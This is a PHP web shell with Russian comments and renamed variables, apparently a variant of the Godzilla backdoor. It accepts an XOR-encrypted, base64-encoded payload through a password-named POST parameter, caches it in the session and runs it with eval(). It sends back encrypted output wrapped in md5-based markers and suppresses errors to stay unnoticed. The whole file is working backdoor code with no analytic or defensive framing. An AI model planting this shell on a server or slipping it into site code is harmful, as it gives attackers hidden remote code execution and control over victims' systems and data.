<?php
@session_start(); // Начать сеанс
@set_time_limit(0);
@error_reporting(0); // Отключить отчеты об ошибках
function processDataStream($inputString,$secretKey){
    // Цикл обработки строки
    for($counter=0;$counter<strlen($inputString);$counter++) {
        $charKey = $secretKey[$counter+1&15]; // Получить ключ символа
        $inputString[$counter] = $inputString[$counter]^$charKey;
    }
    return $inputString; // Вернуть результат
}
$accessKey='wolfshell';
$storageIdentifier='payload'; // Идентификатор для хранения
$encryptionSecret='3c6e0b8a9c15224a';
if (isset($_POST[$accessKey])){
    $incomingData=processDataStream(base64_decode($_POST[$accessKey]),$encryptionSecret);
    if (isset($_SESSION[$storageIdentifier])){
        $storedPayload=processDataStream($_SESSION[$storageIdentifier],$encryptionSecret); // Загрузить полезную нагрузку
        if (strpos($storedPayload,"getBasicsInfo")===false){
            $storedPayload=processDataStream($storedPayload,$encryptionSecret);
        }
		eval($storedPayload); // Выполнить код
        echo substr(md5($accessKey.$encryptionSecret),0,16);
        echo base64_encode(processDataStream(@run($incomingData),$encryptionSecret)); // Отправить ответ
        echo substr(md5($accessKey.$encryptionSecret),16);
    }else{
        if (strpos($incomingData,"getBasicsInfo")!==false){
            $_SESSION[$storageIdentifier]=processDataStream($incomingData,$encryptionSecret); // Сохранить в сеансе
        }
    }
}
